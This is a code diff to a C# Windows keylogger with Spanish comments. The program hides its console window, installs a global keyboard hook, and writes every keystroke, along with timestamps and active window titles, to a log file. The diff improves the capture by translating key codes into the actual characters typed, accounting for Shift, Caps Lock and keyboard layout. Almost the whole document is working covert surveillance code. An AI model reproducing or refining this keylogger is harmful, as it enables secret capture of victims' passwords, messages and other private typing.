@@ -4,7 +4,6 @@ using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
 
 class KeyLogger
@@ -21,28 +20,22 @@ class KeyLogger
     [STAThread]
     static void Main()
     {
-        // Oculta la consola
+        // Ocultar consola
         IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        // Crear ruta del log en el mismo directorio
+        // Ruta del log
         string exePath = Assembly.GetExecutingAssembly().Location;
         string exeDir = Path.GetDirectoryName(exePath);
         string logPath = Path.Combine(exeDir, "log.txt");
 
-        // Abrir archivo de log
         logWriter = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
         {
             AutoFlush = true
         };
 
-        // Instalar hook
         _hookID = SetHook(_proc);
-
-        // Bucle de mensajes
         Application.Run();
-
-        // Al cerrar
         UnhookWindowsHookEx(_hookID);
         logWriter.Close();
     }
@@ -64,29 +57,46 @@ class KeyLogger
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
-            string key = ((Keys)vkCode).ToString();
-            string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
-            // Obtener la ventana activa
+            // Obtener ventana activa
             IntPtr hWnd = GetForegroundWindow();
-            StringBuilder buffer = new StringBuilder(256);
-            GetWindowText(hWnd, buffer, 256);
-            string currentWindowTitle = buffer.ToString();
+            StringBuilder winBuffer = new StringBuilder(256);
+            GetWindowText(hWnd, winBuffer, 256);
+            string currentWindowTitle = winBuffer.ToString();
 
-            // Si cambió la ventana
             if (currentWindowTitle != lastWindowTitle)
             {
                 lastWindowTitle = currentWindowTitle;
+                string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                 logWriter.WriteLine();
                 logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
             }
 
-            logWriter.WriteLine("  " + key);
+            // Obtener layout
+            IntPtr layout = GetKeyboardLayout(0);
+
+            // Estado de teclas
+            byte[] keyState = new byte[256];
+            GetKeyboardState(keyState);
+
+            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
+                keyState[VK_SHIFT] = 0x80;
+            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
+                keyState[VK_CAPITAL] = 0x01;
+
+            // Traducir a carácter real
+            StringBuilder buffer = new StringBuilder(5);
+            int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);
+
+            string key = (result > 0) ? buffer.ToString() : "[" + ((Keys)vkCode).ToString() + "]";
+
+            logWriter.Write(key);
         }
+
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 
-    // DLL imports
+    // Windows API
     [DllImport("user32.dll")]
     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
         IntPtr hMod, uint dwThreadId);
@@ -113,5 +123,26 @@ class KeyLogger
     [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
+    [DllImport("user32.dll")]
+    private static extern short GetKeyState(int nVirtKey);
+
+    [DllImport("user32.dll")]
+    private static extern bool GetKeyboardState(byte[] lpKeyState);
+
+    [DllImport("user32.dll")]
+    private static extern int ToUnicodeEx(
+        uint wVirtKey,
+        uint wScanCode,
+        byte[] lpKeyState,
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
+        int cchBuff,
+        uint wFlags,
+        IntPtr dwhkl);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetKeyboardLayout(uint idThread);
+
     private const int SW_HIDE = 0;
+    private const int VK_SHIFT = 0x10;
+    private const int VK_CAPITAL = 0x14;
 }
